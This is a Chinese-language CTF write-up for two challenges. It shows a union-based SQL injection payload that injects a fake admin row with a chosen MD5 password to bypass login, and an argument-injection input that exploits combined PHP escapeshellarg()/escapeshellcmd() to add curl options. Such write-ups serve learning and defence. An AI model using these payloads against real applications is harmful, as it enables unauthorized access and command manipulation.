[GXYCTF2019]BabySQli

随意输入username和password，得到一个search.php的回显页，查看源码，发现一段注释，经过base32和base64的两次解码，得到select * from user where username = '$name'，说明注入时要闭合单引号，是字符型注入，FUZZ扫一下，发现union没有被过滤，order by被过滤了，于是用select去爆有几个字段，发现name=1'union select 1,2,3#&pw=123456 无报错，正好有3个字段，但它只有两个回显“wrong user!”和“wrong pass!”(当username=admin)，常规的联合注入不行，这里应该要搞到admin的密码然后登录。后面就不会了，下面就是看WP学到的东西：

name=1'union select 'admin',2,3#&pw=123456 ，回显“wrong user!”；name=1'union select 1,'admin',3#&pw=123456 ，回显“wrong pass!”，说明数据库中第二个字段为username

这里要用到联合注入的一个技巧，在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。所以可以利用联合查询来创建一行admin账户的续集数据，混淆admin用户的密码，将自定义的admin用户的密码加进去。这里数据库里的密码还存在md5加密，所以构造payload：name=1'union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&pw=123456，md5(123456)=e10adc3949ba59abbe56e057f20f883e，然后登录。

[BUUCTF 2018]Online Tool

这里一开始以为是执行多条命令，用||等尝试发现不行，看了WP才知道原来是一个漏洞——PHP escapeshellarg()+escapeshellcmd() 之殇。这里重点是关于这两个函数的理解：有一篇文章分析的很到位——谈谈escapeshellarg参数绕过和注入的问题

  1. 传入的参数是：172.17.0.2' -v -d a=1
  2. 经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
  3. 经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义
  4. 最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
